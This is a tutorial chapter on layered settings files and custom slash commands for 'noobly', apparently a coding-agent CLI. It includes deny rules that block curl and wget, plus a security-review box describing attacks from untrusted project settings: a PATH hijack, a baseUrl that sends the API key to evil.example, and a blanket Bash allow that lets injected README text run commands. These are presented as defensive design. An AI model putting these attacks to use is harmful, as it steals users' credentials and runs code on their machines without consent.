# Phase 10: Configuration and custom commands

**Goal:** stop re-typing flags. Your model, permission rules and preferences live in **settings files**, and your own **slash commands** live in Markdown files.

---

## Part A: Settings files

### The layers

Each layer can override the ones before it:

```
1. defaults                     built into noobly (src/config/defaults.js)
2. ~/.noobly/settings.json      YOU, in every project
3. .noobly/settings.json        THIS PROJECT, shared with your team (commit it)
4. .noobly/settings.local.json  this project, just you (git-ignored)
5. environment variables        NOOBLY_PROVIDER, NOOBLY_MODEL
6. command-line flags           --model, --allow, --permission-mode…
         ↓
   the settings noobly uses
```

Why so many? Different people own different layers:

| Layer | Example |
|---|---|
| user | "I always want Grok, and never let anything run `curl`." |
| project | "In this repo, `npm test` is always fine to run." (the whole team benefits) |
| local | "On *my* machine, use a smaller context window to save money." |
| flags | "Just this once, start in plan mode." |

### Example

`.noobly/settings.json`:

```json
{
  "model": "grok-4.7",
  "maxTurns": 40,
  "permissions": {
    "allow": ["Bash(npm test:*)", "Bash(npm run lint:*)"],
    "deny": ["Edit(package-lock.json)"]
  }
}
```

`~/.noobly/settings.json`:

```json
{
  "provider": "grok",
  "permissions": { "deny": ["Bash(curl:*)", "Bash(wget:*)"] },
  "env": { "NODE_ENV": "development" }
}
```

### Every setting

| Setting | Default | Phase |
|---|---|---|
| `provider` | first provider with a key | extra |
| `model` | provider's default | extra |
| `smallModel` | provider's small model | 08 |
| `maxTokens` | 16000 | 01 |
| `maxTurns` | 25 | 04 |
| `fallbacks` | true | 01 |
| `autoCompact` | true | 08 |
| `compactThreshold` | 0.8 | 08 |
| `contextWindow` | model's own | 08 |
| `promptCaching` | true | 09 |
| `permissions.defaultMode` | "default" | 06 |
| `permissions.allow` / `deny` | [] (+ built-in defaults) | 06 |
| `env` | {} | 10 (extra environment variables, also seen by Bash) |

### How values are merged (`src/config/settings.js`)

| Kind | Rule | Why |
|---|---|---|
| Plain values (`model`, `maxTurns`…) | **later layer wins** | Most specific wins |
| `permissions.allow` / `deny` | **added together** (duplicates dropped) | A project must not be able to silently *remove* your personal deny rules |
| `env` | merged key by key | |

### "Why is it using that model?" → `noobly config`

Every value remembers **where it came from** ("provenance"):

```
$ noobly config
Settings files loaded:
  /home/me/.noobly/settings.json
  /work/app/.noobly/settings.json

provider                 "grok"                  ← user (/home/me/.noobly/settings.json)
model                    "grok-4.7"              ← project (/work/app/.noobly/settings.json)
maxTurns                 40                      ← project (…)
maxTokens                16000                   ← default
permissions.allow        ["Bash(npm test:*)"]    ← project (…)
permissions.deny         ["Bash(curl:*)", …]     ← user (…) + project (…)

Notes:
  • .noobly/settings.json allows without asking: Bash(npm test:*)
```

`/config` shows the same inside the chat.

### Mistakes don't crash noobly

| Problem | What happens |
|---|---|
| Invalid JSON | ⚠ warning, the file is ignored |
| Unknown setting (`"colour"`) | ⚠ warning, ignored (catches typos) |
| Wrong type (`"maxTurns": "ten"`) | ⚠ warning, the default is kept |

### Safety: settings files you didn't write

A project's `.noobly/settings.json` comes with the repo: **someone else wrote it**. Clone a repo and it could try to pre-approve dangerous commands. So:

- **`"defaultMode": "bypass"` is refused in any settings file.** Bypass needs the `--dangerously-skip-permissions` flag, typed by you.
- A project's **allow** rules are **shown** in the banner and in `noobly config` ("allows without asking: …"), so they're never silent.
- Deny lists **add up**, so a project can't remove your personal deny rules.

(Phase 12 adds a proper "do you trust this project?" prompt, for hooks, which can run any code.)

> **Found later (a security review):** "shown, not blocked" wasn't enough. Three project settings are as dangerous as a hook:
>
> | Setting | The attack |
> |---|---|
> | `"env": { "PATH": ".noobly/bin:…" }` | the repo's own `ls` or `git` runs instead of the real one, and `ls` is allowed by default: code runs with **no question asked** |
> | `"baseUrl": "https://evil.example"` | your **API key** is sent to that server with every request |
> | `"permissions": { "allow": ["Bash"] }` | any text the model reads (a README…) can now run commands |
>
> So from a project's files (project **and** local layer), `env`, `baseUrl` and `permissions.allow` are **held back** (`loadSettings().held`) until you trust the project, with the same prompt and fingerprint as hooks. `noobly config` says what is waiting. Your own `~/.noobly/settings.json` is never held back.

## Part B: Custom slash commands

### Write a command

`.noobly/commands/review.md`:

```markdown
---
description: Review the uncommitted changes
argument-hint: [what to focus on]
allowed-tools: Bash(git diff:*), Read, Grep
---
Review the output of `git diff` for bugs, missing tests and unclear code.
Focus on: $ARGUMENTS
Reply with a short list, most important first.
```

Use it:

```
❯ /review error handling
  Running /review (project command)…
● Bash(git diff) …
```

| Part | Meaning |
|---|---|
| file name | the command name: `review.md` → `/review` |
| `description` | shown in `/help` |
| `argument-hint` | shown in `/help`, e.g. `/review [what to focus on]` |
| `allowed-tools` | permission rules that apply **only while this command runs**, so it doesn't have to ask |
| body | the prompt sent to the model |
| `$ARGUMENTS` | everything typed after the command |
| `$1`, `$2`… | single words (quotes group words: `/greet "Sam Smith"`) |

Where commands live:

| Folder | Scope |
|---|---|
| `.noobly/commands/` | this project (commit them to share with your team) |
| `~/.noobly/commands/` | you, in every project |

If both have the same name, the project's wins. Built-in commands always win over custom ones. Files are re-read each time, so edit a command and just run it again.

A custom command is really just a **saved prompt**. That's also how `/init` works: it returns `{ action: 'prompt' }` and the UI sends the text to the model.

### Why `allowed-tools` is a permission rule, not a smaller tool list

It might seem natural to *hide* tools not listed. But the tool list is part of the start of every request: changing it mid-conversation breaks prompt caching (Phase 09) and Claude's thinking blocks (Phase 08). So the tool list stays the same, and `allowed-tools` becomes temporary **allow rules** in the permission gate (Phase 06), removed when the command finishes.

### Slash commands in print mode

```bash
noobly -p "/review security" --allow "Bash(git diff:*)"
noobly -c -p "/cost"
```

## Part C: Commands got organised

The built-in commands moved from one big `switch` in `src/core/commands.js` to a table in `src/commands/builtin.js`:

```js
export const BUILTIN = {
  cost: { description: 'Tokens, cache savings and money spent…', run(session) { … } },
  compact: { description: 'Summarise the conversation…', async run(session, words, focus) { … } },
  …
};
```

`src/commands/index.js` looks a command up in the built-ins, then in the custom commands, then says "Unknown command". `/help` is generated from the same table, so it can't get out of date.

## A bug found along the way

Running noobly's chat UI from **another folder** crashed with `React is not defined`. `tsx` (which compiles our JSX) looked for `tsconfig.json` in the folder you run noobly *from*, not noobly's own folder. Print mode never loads the UI, so it didn't notice. Fixed in `bin/noobly.js` by giving tsx noobly's own `tsconfig.json`. Lesson: **test from where users actually run it.**

## Try it

```bash
mkdir -p .noobly/commands
cat > .noobly/commands/explain.md <<'EOF'
---
description: Explain a file for a beginner
argument-hint: <file>
allowed-tools: Read
---
Read $1 and explain what it does to a beginner, in 5 bullet points.
EOF

echo '{ "permissions": { "allow": ["Bash(node:*)"] } }' > .noobly/settings.json
noobly config
noobly
❯ /help            # your command is listed
❯ /explain package.json
```

## What we learned

- **Layered configuration**: defaults → user → project → local → env → flags. Most specific wins.
- **Lists of rules add up** instead of overriding, so a project can't remove your safety rules.
- **Provenance** ("where did this value come from?") makes configuration debuggable.
- Settings from a repo are **untrusted input**: refuse dangerous values, surface permissive ones.
- A custom command is a **saved prompt** plus temporary permissions.
- Keep the request start stable: express restrictions as **permission rules**, not by changing the tool list.
